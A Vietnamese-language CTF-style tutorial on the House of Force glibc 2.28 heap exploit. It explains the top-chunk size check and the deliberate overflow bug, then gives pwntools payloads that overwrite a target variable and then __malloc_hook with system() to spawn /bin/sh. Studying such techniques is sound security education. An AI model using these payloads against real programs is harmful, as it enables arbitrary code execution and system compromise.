# First Lesson: `House-of-force`
>Glibc ver: 2.28
Trong bài viết này, mình sẽ giải thích những vấn đề bao gồm:

- Top chunk hoạt động ra sao?

- Bug ở đâu?

- Làm sao để ta chuyển bug đó thành 1 primitive arbitrary write?

- Tại sao công thức `delta()` lại hoạt động?

- Nếu như chúng ta đã có 1 primitive mạnh, ta nên ghi đè giá trị quan trọng nào để `drop the shell`?

### Top chunk(2.28-no-tcache) check những gì và bài này đã lợi dụng việc allocator không check gì?

- Khác với những kỹ thuật xoay quanh `fastbin` hay `tcache`, `House of Force` làm việc trực tiếp với `top chunk`, tức phần vùng nhớ còn lại của heap mà allocator chưa cấp phát.

- Khi `malloc()` lấy bộ nhớ từ `top chunk`, điều quan trọng nhất mà allocator quan tâm là: `size(top) >= nb + MINSIZE`. Nếu điều kiện này đúng thì nó sẽ cắt `top chunk` ra, trả 1 chunk cho user, rồi đẩy `top` tiến lên phía trước.

- Nói ngắn gọn, allocator có check rằng top chunk hiện tại có đủ lớn để phục vụ request lần này.

- Nhưng allocator không thực sự xác minh rằng cái `size` đang nằm trong top chunk có còn đáng tin nữa hay không. Một khi ta có thể overflow vào trường `size` này và biến nó thành 1 giá trị cực lớn, `_int_malloc` sẽ tin giá trị đó là thật và tiếp tục split top chunk như bình thường.

- Và đó chính là thứ mà `House of Force` lợi dụng: không phải `malloc` cho ta arbitrary write ngay lập tức, mà là ta lừa allocator dời `top` tới gần địa chỉ cần ghi đè, rồi dùng lần `malloc` kế tiếp để ghi trực tiếp vào mục tiêu.

### Bug Class - Heap OverFlow

- I/O cơ bản của chương trình:
ta có thể chọn `malloc`, nhập `size`, và chương trình sẽ cấp phát 1 chunk với size đó.

- Điểm đáng chú ý nằm ở chỗ nhập `data`: chương trình không chỉ đọc `malloc_usable_size(ptr)` byte, mà nó đọc tới `malloc_usable_size(ptr) + 8`.

- Đây là bug rất quan trọng. Ví dụ, khi ta request `24`, glibc của bài này cho ta đúng `24` byte usable size, nhưng chương trình lại đọc `32` byte. 8 byte dư ra này không rơi vào khoảng trống vô hại nào cả, mà nó đè thẳng vào `size field` của top chunk nằm ngay sau chunk hiện tại.

- Vì vậy, bug ở đây là 1 `heap overflow` rất clean: chỉ với 1 request nhỏ, ta đã có thể sửa metadata quan trọng nhất của allocator, đó là `top chunk size`.

### Primitive Discovery

- Vậy làm sao từ bug này, ta có thể chuyển nó thành 1 primitive mạnh?

- Tạm bỏ qua việc khai thác lỗ hổng, ta tập trung vào việc chứng minh rằng bug này có thể thực hiện được arbitrary write và thử sử dụng nó để ghi đè giá trị `target` ở `0x602010`.


![alt text](image-1.png)


- Đầu tiên, ta ghi đè top chunk bằng 1 giá trị cực lớn, ví dụ `0xffffffffffffffff`.


![alt text](image.png)


- Từ đây, ta có thể khiến chương trình tin rằng phần heap còn lại là cực lớn. Một khi allocator đã tin size giả này, ta có thể dùng 1 request rất to để kéo `top` tới gần bất kỳ địa chỉ nào mình muốn. Khi sử dụng lệnh `vis` trong pwndbg, ta thấy rằng chương trình thực sự đã coi giá trị cực lớn này như 1 top chunk hợp lệ:


![alt text](image-2.png)


- Nhưng địa chỉ của heap là `0x603000` trong khi địa chỉ của target là `0x602010`, vậy làm sao 1 buffer ở địa chỉ cao hơn có thể ghi đè được 1 địa chỉ thấp hơn?

- Câu trả lời nằm ở wrap-around của không gian địa chỉ 64-bit. `malloc` sẽ đẩy `top` đi bằng 1 phép cộng trên số unsigned. Nếu request đủ lớn, phép cộng này sẽ tràn qua `0xffffffffffffffff` rồi "quấn vòng" về những địa chỉ thấp hơn. Vì vậy, dù `target` nằm thấp hơn heap, ta vẫn có thể kéo `top` quay ngược xuống đó.

- Ta có công thức:

```python
def delta(x, y):
    return (0xffffffffffffffff - x) + y
```

- `delta(x, y)` chính là khoảng cách wrap-around từ địa chỉ `x` tới địa chỉ `y` trong không gian địa chỉ 64-bit.


![alt text](image-3.png)


- Tại sao lại là distance giữa `heap + 0x20` và `target - 0x20`?

- Vì ta không nhắm trực tiếp vào `target`, mà nhắm vào vị trí của `top chunk` sau lần `malloc` cực lớn. Sau lần `malloc` đó, ta muốn lần `malloc(24, data)` kế tiếp trả về 1 buffer mà qword đầu tiên của user-data đè đúng lên `target`. Trong layout của bài này, điều đó tương đương với việc kéo `top` tới `target - 0x20`.

- Nói cách khác, cái ta đang tính không phải là "khoảng cách từ chunk hiện tại tới target", mà là "khoảng cách wrap-around từ top chunk hiện tại tới vị trí mà top chunk mới cần đứng".


![alt text](image-4.png)


- Để hiểu rõ hơn, ta cần debug cụ thể. Có thể thấy, sau khi ta `malloc` 1 chunk cực lớn, hiện tượng này đã xảy ra:


![alt text](image-5.png)


- Lúc này, khoảng cách từ top chunk mới tới target đã bị rút ngắn đúng như ta mong muốn, và chunk tiếp theo mà ta có thể `malloc` ra sẽ trực tiếp overlap với `target`:


![alt text](image-6.png)


- Cuối cùng là ghi đè giá trị `target`:


![alt text](image-8.png)


- Payload cuối chứng minh primitive:

```python
# =============================================================================

# Request a small chunk to overflow from.
# Fill the chunk's user data with garbage then overwrite the top chunk's size field with a large value.
malloc(24, b"Y"*24 + p64(0xffffffffffffffff))

# Make a very large request that spans the gap between the top chunk and the target data.
# The chunk allocated to service this request will wrap around the VA space.
malloc(delta((heap + 0x20), (elf.sym.target - 0x20)), b"Y")

# Request another chunk; the first qword of its user data overlaps the target data.
malloc(24, b"Much win")

# =============================================================================
```

### Exploitation

- Vậy làm sao để ta có thể sử dụng cái primitive này để khai thác chương trình?

 => Ta phải dùng primitive này để ghi đè vào 1 địa chỉ quan trọng trong chương trình, từ đó thay đổi CFG theo ý chúng ta. Tuy vậy, ta nên ghi đè vào giá trị nào?

- Ta có thể ghi đè vào các địa chỉ quan trọng ở stack, và ta nghĩ ngay tới `retaddr` hoặc là các function pointer trên stack. Nhưng vì stack thuộc ASLR region và ta không có leak stack, nên ta sẽ loại trừ phương án này.

- Chúng ta cũng có thể target các địa chỉ ở binary. Khi nghĩ tới `code execution`, ta sẽ nghĩ tới `GOT` hoặc `__fini_array`. `__fini_array` là 1 mảng gồm các con trỏ hàm, và mỗi hàm trong đó sẽ được gọi khi chương trình thoát, nên về lý thuyết ta có thể ép chương trình `exit` để chiếm luồng thực thi. Tuy nhiên, vì RELRO được bật `full` nên những vùng này là `read-only`, nên ta sẽ loại trừ phương án này.

- Ta cũng có thể target `heap`, nhưng trong layout của bài này thì heap không chứa con trỏ hay dữ liệu nào đủ mạnh để biến arbitrary write thành code execution một cách trực tiếp, nên ta cũng bỏ qua hướng này.

- Ta có libc leak, nên ta có thể access vào những địa chỉ quan trọng của libc. Hai thứ dễ nghĩ tới là `__exit_funcs` và `tls_dtors`, là các danh sách hàm cleanup sẽ được gọi khi thoát chương trình. Tuy nhiên, vì Pointer Guard / pointer mangling, nên đây không phải hướng ổn định nhất cho bài này.

- Tuy vậy, ta vẫn có thể target được 1 mục tiêu rất đặc thù của allocator, đó là `__malloc_hook`. Đây là 1 function pointer, và vì ta có libc leak nên ta biết được địa chỉ của `__malloc_hook`. Từ đó, nếu ghi đè nó bằng `system`, thì lần tới `malloc` được gọi, hook này sẽ chạy thay cho luồng bình thường.

- Vậy giờ hướng đi đã rõ: trước hết, ta sẽ `malloc(24, b"Y"*24 + p64(0xffffffffffffffff))` để ghi đè top chunk thành 1 giá trị cực lớn.

- Sau đó, ta `malloc` 1 chunk rất lớn để thu hẹp khoảng cách từ top chunk hiện tại tới `__malloc_hook - 0x20`, để lần `malloc(24, data)` kế tiếp sẽ overlap với `__malloc_hook`.

- Tiếp đó, ta ghi đè hook bằng `system`. Vì `__malloc_hook` nhận đối số chính là size truyền vào `malloc`, nên lần tới ta chỉ cần gọi `malloc(addr_of_binsh, b"")` là đủ để biến nó thành `system("/bin/sh")`.

- Payload cuối cùng:

```python
# Request a chunk; overflow its user data and overwrite the top chunk's size field with a large value.
# Write a "/bin/sh" string here if not using the one in libc.
malloc(24, b"/bin/sh\0" + b"Y"*16 + p64(0xffffffffffffffff))

# Make a very large request that spans the gap between the top chunk and the malloc hook.
# Target the malloc hook because the designer can't explicitly call free().
malloc((libc.sym.__malloc_hook - 0x20) - (heap + 0x20), b"Y")

# The next chunk to be requested overlaps the malloc hook; overwrite it with the address of system().
malloc(24, p64(libc.sym.system))


# ---  OPTION 1  ---

# Call malloc() with the address of the string "/bin/sh" in libc as its argument to trigger system("/bin/sh").
malloc(next(libc.search(b"/bin/sh")), b"")


# ---  OPTION 2  ---

# Alternatively, call malloc() with the address of a "/bin/sh" string on the heap as its argument.
#malloc(heap + 0x10, b"")
```
